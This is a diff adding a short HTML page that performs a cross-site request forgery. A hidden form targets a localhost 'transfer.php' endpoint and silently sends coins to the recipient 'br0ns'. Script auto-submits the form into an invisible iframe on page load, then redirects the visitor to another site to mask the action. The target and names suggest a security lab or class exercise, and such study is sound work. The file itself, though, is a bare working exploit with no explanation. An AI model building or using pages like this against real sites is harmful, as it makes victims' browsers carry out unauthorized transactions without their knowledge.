@@ -1,0 +1,18 @@
+<html>
+    <head>
+    </head>
+    <body>
+    <iframe style="visibility:hidden; display:none" name=hiddenframe></iframe>
+        <form method="POST" name=transferform action="http://localhost/barbarbar/transfer.php" target="hiddenframe">
+            <input name=coins value="1" type=hidden>
+            <input name=recipient value="br0ns" type=hidden>
+            <input name=submission value="Send" type=hidden>
+        </form>
+        <script>
+        document.transferform.submit();
+        setTimeout(function () {
+            location.assign('http://yesimparanoid.com');
+        }, 100);
+        </script>
+    </body>
+</html>
